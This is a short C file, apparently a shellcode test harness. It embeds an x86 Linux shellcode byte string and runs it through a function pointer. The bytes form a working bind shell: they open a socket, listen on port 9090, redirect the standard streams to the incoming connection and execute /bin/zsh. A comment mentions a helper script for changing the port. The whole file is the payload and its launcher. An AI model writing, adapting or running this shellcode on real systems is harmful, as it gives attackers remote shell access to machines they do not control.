#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\x31\xff\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\xb0\x66\x5b\x5e\x52\x66\x68"
//"\x23\x82" // Use port2shell.py to change current port (9090)
"\x23\x82"
"\x66\x53\x6a\x10\x51\x57\x89\xe1\xcd\x80\x5a\xb0\x66\x80\xc3\x02\xcd\x80\x50\x50\xb0\x66\x43\x52\x89\xe1\xcd\x80\x93\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
